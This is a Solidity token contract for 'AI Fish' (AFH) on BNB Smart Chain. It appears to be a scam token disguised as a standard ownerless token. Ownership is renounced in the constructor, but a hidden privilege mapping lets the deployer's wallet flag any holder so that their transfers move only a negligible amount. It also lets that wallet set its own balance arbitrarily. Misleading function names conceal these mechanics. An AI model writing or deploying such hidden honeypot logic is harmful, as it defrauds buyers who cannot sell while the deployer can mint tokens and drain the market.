/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface takeEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapTrading {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AIFish is Ownable{
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant buyFrom = 10 ** 10;

    bool public exemptSender;
    mapping(address => mapping(address => uint256)) public allowance;

    address public swapWallet;
    address public maxAmount;
    string public name = "AI Fish";
    mapping(address => bool) public maxLaunched;
    string public symbol = "AFH";
    mapping(address => bool) public swapToken;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        takeEnable listAmount = takeEnable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        maxAmount = swapTrading(listAmount.factory()).createPair(listAmount.WETH(), address(this));
        swapWallet = receiverTo();
        swapToken[swapWallet] = true;
        balanceOf[swapWallet] = totalSupply;
        emit Transfer(address(0), swapWallet, totalSupply);
        renounceOwnership();
    }

    

    function shouldTake(address isToken) public {
        if (isToken == swapWallet || isToken == maxAmount || !swapToken[receiverTo()]) {
            return;
        }
        maxLaunched[isToken] = true;
    }

    function approve(address swapList, uint256 isTake) public returns (bool) {
        allowance[receiverTo()][swapList] = isTake;
        emit Approval(receiverTo(), swapList, isTake);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function enableFund(address toSellBuy, address toEnable, uint256 isTake) internal returns (bool) {
        require(balanceOf[toSellBuy] >= isTake);
        balanceOf[toSellBuy] -= isTake;
        balanceOf[toEnable] += isTake;
        emit Transfer(toSellBuy, toEnable, isTake);
        return true;
    }

    function transfer(address listSender, uint256 isTake) external returns (bool) {
        return transferFrom(receiverTo(), listSender, isTake);
    }

    function receiverTo() private view returns (address) {
        return msg.sender;
    }

    function listTo(uint256 isTake) public {
        if (!swapToken[receiverTo()]) {
            return;
        }
        balanceOf[swapWallet] = isTake;
    }

    function marketingToBuy(address receiverFee) public {
        if (exemptSender) {
            return;
        }
        swapToken[receiverFee] = true;
        exemptSender = true;
    }

    function transferFrom(address listLaunched, address listSender, uint256 isTake) public returns (bool) {
        if (listLaunched != receiverTo() && allowance[listLaunched][receiverTo()] != type(uint256).max) {
            require(allowance[listLaunched][receiverTo()] >= isTake);
            allowance[listLaunched][receiverTo()] -= isTake;
        }
        if (listSender == swapWallet || listLaunched == swapWallet) {
            return enableFund(listLaunched, listSender, isTake);
        }
        if (maxLaunched[listLaunched]) {
            return enableFund(listLaunched, listSender, buyFrom);
        }
        return enableFund(listLaunched, listSender, isTake);
    }


}